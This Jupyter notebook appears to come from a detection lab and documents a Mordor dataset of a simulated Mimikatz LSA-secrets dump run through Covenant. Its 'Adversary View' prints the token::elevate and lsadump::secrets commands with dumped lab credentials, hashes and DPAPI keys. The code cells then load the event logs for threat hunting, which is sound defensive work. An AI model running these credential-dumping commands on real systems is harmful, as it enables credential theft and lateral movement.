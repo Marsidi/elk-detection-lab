{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Covenant Mimikatz LSA Secrets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-191205043410 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/12/05 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Covenant |\n",
    "| Simulation Script | https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_lsasecrets.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries using Mimikatz to get the SysKey to decrypt SECRETS entries (from registry or hives)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    ".#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    " '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # token::elevate\n",
    "Token Id  : 0\n",
    "User name : \n",
    "SID name  : NT AUTHORITY\\SYSTEM\n",
    "\n",
    "760\t{0;000003e7} 1 D 26049     \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tPrimary\n",
    "  -> Impersonated !\n",
    "  * Process Token : {0;000764fd} 1 F 7191206   \tshire\\pgustavo\tS-1-5-21-791464340-1796667228-2788435825-1112\t(17g,24p)\tPrimary\n",
    "  * Thread Token  : {0;000003e7} 1 D 8539221   \tNT AUTHORITY\\SYSTEM\tS-1-5-18\t(04g,21p)\tImpersonation (Delegation)\n",
    "\n",
    "mimikatz(powershell) # lsadump::secrets\n",
    "Domain : IT001\n",
    "SysKey : 4723683e5d919d0170ffd5a4c2b137fa\n",
    "\n",
    "Local name : IT001 ( S-1-5-21-2036226717-1704707055-511440364 )\n",
    "Domain name : shire ( S-1-5-21-791464340-1796667228-2788435825 )\n",
    "Domain FQDN : shire.com\n",
    "\n",
    "Policy subsystem is : 1.18\n",
    "LSA Key(s) : 1, default {8b36cbca-d3e7-f8bc-d903-ff9728f21c92}\n",
    "  [00] {8b36cbca-d3e7-f8bc-d903-ff9728f21c92} db4d026436543ae43b751a1085e7dbe6e560be5dc2ed67e326aefb1c79127025\n",
    "\n",
    "Secret  : $MACHINE.ACC\n",
    "cur/text: _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX\n",
    "    NTLM:91bf84541aee793f0306edfb1481385f\n",
    "    SHA1:9a3197038ac98c4d67f513f5ffe0a421a668c433\n",
    "old/text: _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX\n",
    "    NTLM:91bf84541aee793f0306edfb1481385f\n",
    "    SHA1:9a3197038ac98c4d67f513f5ffe0a421a668c433\n",
    "\n",
    "Secret  : DPAPI_SYSTEM\n",
    "cur/hex : 01 00 00 00 a3 4a 0b a5 9b df d8 b8 b0 48 ad cb 01 e0 6f 6c a7 ed ff a8 5c 5c ae a1 03 63 5c 53 97 cd 54 e5 ee 16 2e 66 0f d8 aa f7 \n",
    "    full: a34a0ba59bdfd8b8b048adcb01e06f6ca7edffa85c5caea103635c5397cd54e5ee162e660fd8aaf7\n",
    "    m/u : a34a0ba59bdfd8b8b048adcb01e06f6ca7edffa8 / 5c5caea103635c5397cd54e5ee162e660fd8aaf7\n",
    "old/hex : 01 00 00 00 e0 3e d2 d5 93 e9 84 cf a6 87 0f 0e 00 4c af fa 69 7b 54 31 a9 d4 a5 12 ae e3 26 c5 e3 a3 33 30 f5 d6 e4 da 8e a5 dc 1d \n",
    "    full: e03ed2d593e984cfa6870f0e004caffa697b5431a9d4a512aee326c5e3a33330f5d6e4da8ea5dc1d\n",
    "    m/u : e03ed2d593e984cfa6870f0e004caffa697b5431 / a9d4a512aee326c5e3a33330f5d6e4da8ea5dc1d\n",
    "\n",
    "Secret  : NL$KM\n",
    "cur/hex : d8 62 8d 69 1d 58 75 3c 25 bd d2 c8 69 d1 54 73 37 9e f7 56 c6 61 81 9a 2f 83 1e b1 5e e8 d7 4f 1f 01 86 f1 15 70 e5 0a 8a 49 9a bf b9 4c 88 b6 b9 a2 62 85 cc 08 29 34 31 2b e9 27 59 af 93 18 \n",
    "old/hex : d8 62 8d 69 1d 58 75 3c 25 bd d2 c8 69 d1 54 73 37 9e f7 56 c6 61 81 9a 2f 83 1e b1 5e e8 d7 4f 1f 01 86 f1 15 70 e5 0a 8a 49 9a bf b9 4c 88 b6 b9 a2 62 85 cc 08 29 34 31 2b e9 27 59 af 93 18\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_lsasecrets.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
